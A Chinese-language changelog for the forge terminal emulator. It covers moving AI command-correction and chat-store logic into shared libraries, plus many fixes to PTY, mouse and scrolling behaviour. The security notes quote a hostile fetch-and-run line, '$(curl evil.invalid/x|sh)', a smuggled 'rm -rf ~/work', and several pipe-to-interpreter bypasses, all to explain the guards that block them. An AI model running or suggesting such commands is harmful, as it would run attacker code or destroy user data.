...
- Block 模式运行中命令的体验改进（针对 claude 等长时流式 TUI）：
  - **运行中可框选文本**：在 live 终端面上拖选时，PTY 字节流被暂存（选区在屏上期间一直暂存，复制/输入/点击别处或清除选区即恢复，上限 2 MiB；早先的“松手后最多 5 秒宽限”已被取消——宽限一到，codex 的下一帧重绘就会在复制前冲掉选区），高频重绘不再瞬间冲掉选区；Shift+拖选在开启鼠标上报的应用里同样受保护。暂存生效时左下角显示 "Output paused — selection" 徽标，消除"卡住了"的错觉。
...
- AI 命令纠错（typo-like 失败后的可审阅纠正）迁移到共享库 `jterm_core::command_correction` 并删除本地副本：`src/ui/command_correction.rs` 从 2148 行缩到 888 行的 UI/策略 shim。四个终端此前各自维护同一套流程（anvil 1817、forge 2148、ember 2335、frost 1552，共 7852 行，其中引擎部分不含任何 GTK 代码），现在合并为一份 3937 行（含测试）的实现，四个应用合计减少 6294 行。分类、token 提取、typo 排序、安全门、provider prompt、严格 JSON 应答解析、helper 解析、有界探测、两级求解与请求 epoch 状态机全部上移；forge 保留的是自己的界面：能到达嵌套分屏叶子的 Notebook 挂载层、50 ms GLib 轮询、块流中的内联审阅卡，以及唯一一个兄弟项目都没有的 tracked submission（已验证命令保持可见且不可交互，直到 `CommandStart` 证明身份为止，证明未到达则撤销 organism assist pulse）。
  ...
  **本轮最大的用户可见变化：`ai_share_command_context` 关闭时（这是默认值），命令纠错不再联系 AI provider。** 失败的命令、工作目录与至多 8 KiB 终端输出不再离开本机。forge 一直发布这个开关、把它写进文档、并要求在启动原生 Codex 任务前打开它，却唯独在这个负载最大的界面上从未查询过它。本地可验证的纠正（APT 索引、可执行文件 PATH、目标自己打印的建议）完全不受影响，证据从来没有离开过机器；已经打开该开关的用户没有任何变化。依赖 AI 纠错的用户请在 `config.toml` 中设置 `ai_share_command_context = true`（或 `FORGE_AI_SHARE_COMMAND_CONTEXT=1`）。
  ...
  其余行为变化：确定性纠正不再走弱化的检查分支，因此任何会扩大命令的替换都会被拒绝——`apt install sud` → `apt install sudo` 不再提供，APT / PATH / 目标输出替换只要引入 `sudo`/`su`/`doas`/`ssh`/`mosh`/`scp`/`sftp`、新的 shell 控制符，或新的“管道进解释器”阶段，一律拒绝。这在友善场景下是真实的功能回退，在敌意场景下是本轮要的修复：这条弱分支读取的是不可信、可能来自远端的目标输出，一台打印 ``Did you mean '$(curl evil.invalid/x|sh)'?`` 的主机能让 `$(curl evil.invalid/x|sh status` 预填进自动获得焦点的命令输入框。只有 shell 自己上报的退出状态才会弹出纠错卡：边界推断、日志恢复和来源未知的完成记录不再触发，因此被中断或强制关闭的块之后不会再出现纠错卡——那些卡片建立在归属错误的旧 scrollback 上。卡片新增 `exit {code} · ` 徽标前缀（forge 是唯一不显示实际发生了什么的副本），失败命令预览限制为 160 字符，长单行命令不再把命令输入框和按钮挤出可视区。发往 provider 的 prompt 结构也变了：四个字段改用 `_untrusted` 后缀的独立键（`cwd_untrusted`、`failure_token_untrusted`、`original_command_untrusted`、`terminal_output_untrusted`）并在写入前净化，同一个失败因此可能得到不同的模型建议。

- AI 聊天面板的多会话状态机迁移到共享库 `jterm_core::ai::chat_store` 并删除本地副本：`src/ui/ai_chat_store.rs` 从 1536 行缩到 75 行的策略 shim；四个终端此前各自维护的同一套状态机（anvil 786、forge 1536、ember 903、frost 791 行，都建立在共用的 `ConversationSnapshot` schema 之上）现在合并为一份 1888 行、47 个用例的实现。forge 送上去的是整库 8 MiB 实时历史预算与真正的压缩、先压缩再序列化并把截断标记同步回内存会话的 `snapshot_for_persistence`、类型化的归档/删除结果，以及会汇报丢弃内容的草稿合并；取回来的是 store 内置的流式累积、会话库查询过滤，以及让草稿恢复幂等的前缀规则。持久化预算不变（每个 chat 至多 100 turn、集合至多 50 chat、turn 文本 4 MiB、紧凑 JSON 8 MiB），实时侧的 8 MiB 与之刻意不等，因此写盘时仍可能再压缩一次并照常标记 `truncated`。用户可见的变化有三处：50 个会话槽位全满且当前是最后一个未归档会话时，归档改为在修改任何状态之前拒绝并提示“Chat limit reached”，此前会把它标记为归档并返回成功，留下一个全部已归档、没有可写会话的库；会话库的预览文本改由 store 统一做 `safe_inline_display` 净化，搜索因此匹配屏幕上真正显示的文本（标题仍在面板侧净化）；流式回复的累积移入 store，256 KiB 上限只剩一处实现，流式期间切走再切回会立即重现已收到的全部内容，而不必等下一个片段（流已经安静时可能永远等不到）。对仍有在途请求的会话执行归档/删除是各应用的构造期策略：forge 保持允许（面板会先取消请求），anvil/ember/frost 为拒绝。
...
- 无 shell 集成（RawFallback）的面板里，kitty 键盘协议的处理补齐了两处：远程标签页的 `ssh`
  和 `forge -e codex` 这类由程序本身充当 PTY 子进程的面板，程序推送的标志现在会真正用于编码
  （Shift+Enter 换行而非提交），`CSI ?u` 的回答也与实际发送的按键一致；本地 shell 重新接管终端
  时会丢弃异常退出的程序遗留的标志，之后的 `python3`、`node` 中 Ctrl+C 仍是 0x03、仍能中断。
- 运行中的内联程序（codex 的 Ctrl+T 转录、claude 的 Ctrl+G 编辑器）进出一次备用屏幕后，卡片不再
  被撑成整页高度；Wayland 触控板在 `less`/`man` 等备用屏幕程序和已完成卡片内的滚动按整格换算，
  轻扫不再跳过几十行或几页。空闲提示符下紧跟在 OSC 133 B 之后的光标位置查询立即得到回答。
- OSC 8 链接的 Ctrl+点击与 “打开链接” 优先打开悬停提示显示的目标，而不是标签里被折行截断的
  URL；卡片的折叠按钮与折叠摘要点击后不再夺走焦点；视图不再跟随底部时总会显示“回到底部”按钮；
  普通命令（构建、`sleep`）运行超过两秒后，即使输出已满一页，仍显示耗时与停止按钮。
- 被中断或挂起的命令（130/141/143/148）在右键菜单中不再提供 “Fix with Agent”/重试，后台标签页
  也不再标为失败；147/149/150 的提示改为 “suspended by … — resume with fg”。VTE 模式的标签页
  同样会在程序发送空标题时恢复为按当前工作目录生成的默认名。
- 状态转换时总会重新下发终端尺寸，`stty cols 60` 之类从 slave 端改掉的尺寸在下一个提示符即被
  纠正；切换卡片密度后尺寸滴答会多观察一帧布局，子进程的窗口尺寸不再与网格不一致。
...
- 选区暂停输出期间，在全屏程序里滚动滚轮会先放开暂停再发送滚轮上报，程序的滚动重绘不再被
  压住而显得滚轮失灵。
- Block 模式下进入/离开 alternate screen 不再改变子进程的 winsize。此前全屏时卡片的边距、
  内边距和边框被整个去掉，网格多出约一行、两列：codex 打开再关闭 `Ctrl+T` 记录浮层（或
  claude 经典模式 `Ctrl+G` 打开编辑器）会收到两次 SIGWINCH，每次都清掉 scrollback 并重放
  整段记录；而且离开时 PTY 记下的是还没收窄的列数，codex 的整宽边框和状态行此后一直折行，
  直到 pane 真正改变大小。现在全屏只去掉卡片的装饰（新的 `block-alt-screen` 类），盒子几何
  在两种密度下都与运行中的卡片完全相同，1049h/l 重新发布的是同一个 winsize，内核不会发出
  SIGWINCH。Unified 模式的 `block-fullscreen` 不变。
- 两条 winsize 发布路径（状态切换时的同步推送与跟随 pane 几何的 settle tick）改为共用一份
  “已告知子进程的尺寸”：同步推送读到的是尚未完成分配的列数时，随后的 tick 会把真正落定的
  尺寸补发一次，而不是因为自己记着更早的样本而跳过。每次同步推送（含密度切换与全屏装饰
  切换）之后都会启动 settle tick；只有尺寸确实变化时才计入 resize 代数，提示符锚点不再把
  一次无变化的推送当成重排。
- 运行中的内联命令里走一趟 alternate screen 不再把 live 卡片钉成整个 pane 高：codex 看完
  `Ctrl+T` 回来仍是原来那张十来行的卡片，上方的历史块留在屏幕上。1049/1047 会原样恢复主屏，
  所以全屏期间保留进入前的高水位；无 shell 集成的 RawFallback 仍锁定整页。
- 开启 `preserve_live_scrollback` 时，运行中的卡片重新是整页：网格在 CommandStart 长到视口
  高度时 ring 底部对齐，命令输出落在网格最后几行，而按光标行程测量的卡片只截取网格顶部，
  显示的是上一条命令的残行，停在底部的内联 TUI（codex）根本看不到。上面那条记录承诺的整页
  回退（见下文“闪屏已修复”一条）现在真正生效。
- 全屏鼠标程序（claude 全屏界面、opencode、htop、vim）的滚轮上报按滚动量累计为整格再发送，
  触控板与高精度滚轮不再每个事件都滚一整格；单个事件最多发送 10 格。Wayland 触控板的像素
  增量先按 GTK 的 10 像素/格换算，live 卡片、历史区与已完成卡片的滚轮滚动同样按单位换算，
  一次轻扫不再滚动两页。鼠标跟踪模式（`?9`/`?1000`/`?1002`/`?1003`）与编码（`?1005`/
  `?1006`/`?1015`）分开记录：htop、ncurses 发送的 `?1006;1000h` 与 vim 的
  `?1006;1000h`+`?1002h` 此前被当成“最后一次写入为准”，拿到的是旧式 `ESC [ M` 字节，
  现在按请求使用 SGR 编码；单独的 `?1006h` 也不再被当作开启了鼠标上报。
- 鼠标 TUI 未关闭鼠标上报就退出（SIGKILL、OOM、ssh 断线）时，pane 不再一直以为上报仍然
  开着：被接受的命令结束（仍在 alternate screen 时）与下一个提示符都会清除鼠标状态，
  点击移动光标恢复可用，less/man 的滚轮重新得到 VTE 的方向键翻页。开启
  `preserve_live_scrollback` 时 live VTE 不会被重置，此时还会向它发送关闭鼠标与焦点上报
  的序列，避免点击与焦点上报继续流进 shell。
- 全屏程序占据 pane 时，`Ctrl+Shift+F` 不再统计被隐藏的已完成块里的匹配（报出屏幕上看不见的
  “N 个匹配”），而是直接搜索正在显示的 live 终端；进入全屏前建立的搜索在下一次跳转时重建。
- alternate screen 中的输出现在也会报告 pane 活动（每 100 ms 至多一次）：后台标签里的
  opencode 或 claude 全屏界面在工作时，分屏的活动标记与 organism 能看到它。
- Agent 持续输出（codex/kimi 约 10 Hz 重绘）期间，拖动滚动条、查找跳转、书签与命令面板跳转
  进入最近几张卡片不再在 100 ms 内被拉回底部：用户自己的滚动在发生时就记下“停止跟随”，
  之后只在确实回到底部时才解除；此前只有 live 卡片整张离开视口才算，而 Agent 的卡片是整页高。
- 跟随底部时，运行状态不再以整宽横条盖在 live 卡片上方：改为右上角的紧凑胶囊（用时 + Stop），
  并在 live 卡片顶部落到胶囊下方时隐去，codex、kimi 等内联 Agent 长到整页高后前一两行不再被
  永久遮住；滚动到历史中仍显示整宽状态条；最小化后状态条缩成右侧按钮，不再留下一整条背景。
- 点击 Stop、跳到最新（FAB）、状态条按钮或卡片标题栏按钮后，键盘焦点不再停在按钮上：此前
  点了 Stop 之后按 `Enter`/空格会再按一次 Stop，给 claude 送去第二个 `^C` 而直接退出；
  Stop 与跳到最新在焦点位于本 pane 时还会把焦点交还 live 终端。
- 运行中的命令期间，卡片仍处于选中状态时（例如点过旧卡片的标题栏），`Up/Down`/`Delete` 交给
  程序并清除选择，不再在 claude 的权限菜单里走动卡片或删除历史卡片；被拒绝的 `Enter` 仍然
  响铃，但同时结束选择，而不是在按下可打印键之前一直吞掉 `Enter`。点击标题栏按钮只执行按钮
  动作，不再顺带进入块选择。
- 选区暂停徽章的提示不再承诺“等几秒就会恢复”：暂停一直持续到复制、输入或点击别处。
- OSC 8 超链接可以打开了：`Ctrl+单击` 与 **Open Link** 先查 URL 正则，再查 OSC 8 目标
  （claude 的 “Security guide” 这类标签不是 URL，此前永远打不开），两者都只接受 http/https；
  悬停时提示框显示真实目标。live 卡片、已完成卡片与右键菜单行为一致。
...
- 命令运行时的查找计数改为读取 live VTE 自己的缓冲区（scrollback 加屏幕），与原生逐个跳转
  ...
  原始字节。
- 退出 codex 这类内联 TUI 后，完成卡片不再只剩第一屏：codex 的视口触底后，会用滚动区域
  （`DECSTBM` + `RI`/换行）把历史插到视口上方，实时 VTE 把它们推进 scrollback；旧的定稿重放
  没有屏幕高度、滚动区域和反向换行，把每批历史写回同样的绝对行，随后被下一次视口重绘覆盖——
  卡片、复制输出、查找、导出和持久化历史都丢掉了第一屏之后的内容。现在带纵向光标移动或滚动的
  输出改由 `jterm_core::screen_replay` 按子进程最后一次收到的 winsize 重放（宽字符占两格，
  超出预算时淘汰最旧的历史而不是丢掉结尾），卡片与文本都保留完整记录；普通行输出仍走原来的
  快速路径，`top`/`watch` 这类循环仍收敛为最后一帧。输出环形缓冲丢掉开头（8 MiB）或重放预算
  淘汰了最旧的行时，卡片标题栏会显示暗色的 “Earlier output not retained”，不再悄无声息地
  从中途开始；截断处残留的半个转义序列或 UTF-8 字符也不再被当作文字打印出来。普通行输出超出
  文本重放预算、丢掉的是结尾时，提示改为 “Output text truncated”（两端都丢时为 “Output only
  partly retained”），不再误称开头被丢弃；提示随块数据保存，撤销、恢复与重新加载历史后仍在。
  Unified 模式在没有 jsh 日志观察者时生成的区域快照也改走同一重放，查找与导出不再只剩第一屏。
...
- 在提示符下按 Tab 弹出的补全菜单不再被压在只有六行高的 live 卡片里。prompt 状态下 live
  ...
  VTE 的 scrollback，只剩四行躲在浮层滚动条后面，下面整片 pane 是空的。现在提示符拿到和
  运行中命令相同的整视口网格，而**卡片**按 shell 实际画出的行数测量——菜单打开时长高覆盖
  它，菜单关闭后收回到紧凑输入行。jsh 的 AI 解释、签名提示，以及任何两行提示符同样受益。
  开启 `preserve_live_scrollback` 的 pane 提示符落在 ring 底部而不是被清空屏幕的顶部，因此
  仍按原来的方式把网格钉在卡片上。
- AI 命令纠错的三个护栏补齐，与 anvil/ember/frost 对齐：候选命令的控制语法检查此前逐个匹配单字符标记，而 `"&&"` 本身包含 `"&"`，因此无法区分 `a & b` 与 `a && b`——原命令里已经有 `|` 时，`ls | grep foo || rm -rf ~/work` 会被当成 `ls | grep foo` 的合法纠正接受；现在改为比较标记集合（`&&`、`||`、`;`、`|`、`&`、`>`、`<`、`$(`、反引号），只复用原命令已有算子的候选仍然放行。远程执行护栏补上 `mosh`（与 `ssh` 一样会在用户没有输入过的主机上开交互会话）。失败分类器改用共享的 `jterm_core::review_input::validate`，不再自己扫描空串与控制符：带 U+202E 等视觉欺骗字符的命令此前会被分类、进入发往 provider 的纠错 prompt，并显示在审阅卡片的“原命令”栏；16 KiB 命令长度上限保持不变。分类覆盖同时补齐：退出码 127（POSIX 的 command not found）在 shell 措辞无法识别时回退到命令的第一个可执行词，`no such subcommand` 加入未知子命令措辞表。
- 窗口快照中无法解析的 `ai_conversation=` 行不再静默丢弃整个会话库：“没有这一行”与“有这一行但本版本读不了”此前是同一个返回值，而窗口早已把快照重命名到自己的 `.active` 文件上，紧接着的第一次自动保存就会用不含该行的内容覆盖它——重复行、超长行、损坏行，以及由更新版本 forge 按更新 schema 写下的会话库，都会被永久删除。现在这种行会先把快照文件隔离到一旁（与读取失败的快照同样处理）再继续，标签页恢复不受影响（它读的是已经在内存里的内容）。
...
- 命令纠错的三个安全漏洞随迁移一并关闭（每个都只在部分副本中存在，因此合并本身就是修复动作）：
  ...
  - **不再自动执行第三方用户拥有的 helper 程序。** `host.rs` 的判据是 `mode & 0o022 != 0 || (uid == euid && mode & 0o200 != 0)`，一个属于另一个账户、权限 0755 的可执行文件对它回答“我写不了”，而 helper 解析会扫描用户自己的 `PATH`——在共享构建机上，排在 `/usr/bin` 之前的恶意 `bash` 会被任何一条失败命令自动拉起，无需提示、无需用户操作。给子进程钳制 `PATH`（forge 一直在做，钳到 `/usr/bin:/bin`）解决不了这个问题：helper 本身就是那个恶意程序。现在统一使用 `jterm_core::helper` 的判据（拒绝 `owner != 0 && owner != euid`）。代价是：如果一台机器上唯一可用的 helper 恰好属于第三方用户，该机器上的 PATH / APT 证据会直接消失，纠错退化为无本地证据可用。
  - **root 下重新可用。** 同一个表达式在 euid 0 时反向成立（每个 root 拥有的二进制都满足 `uid == euid`），因此容器里或 `sudo forge` 启动的 forge 此前拒绝所有系统 helper，静默地不再产出任何 APT / PATH 验证过的纠正。现在恢复正常。
  - **候选命令不能再新增“管道进解释器”。** 标记超集检查只判断某个标记是否*存在*，所以当原命令已经含有管道时，追加 `| sh` 不引入新标记，可以完整通过。forge 是四份副本里唯一做了检查的，但只匹配四种字面写法，`|  sh`（两个空格）、`| /bin/sh`、`| zsh`、`| python3` 都能绕过。新规则拆分管道并比较各阶段实际调用的解释器集合，并有一条以 jagent 自身词法器为基准的测试防止家族分叉。`ls | gerp foo` → `ls | grep foo` 仍然照常提供。

  同时：cwd 中的 bidi 覆盖字符现在以 U+FFFD 形式到达 provider，而不是原样的欺骗序列（`serde_json` 会转义 C0 控制符，但会原样放行 bidi 覆盖与默认忽略字符）；约 1 MiB 的 provider 应答在交给 `serde_json` 之前就被拒绝，不会在纠错 worker 线程上解析；来自终端输出的约 8 KiB 攻击者可控错误 token 不再进入卡片文案；超过 16 KiB 的命令行仍然静默拒绝（forge 原本就是如此，另外三个终端现在与之一致）。持有 stdout 的后台探测子孙进程不再能永久挂住 `forge-command-correction` worker：只有确实向进程组发过信号时才 join 读取线程，否则分离。
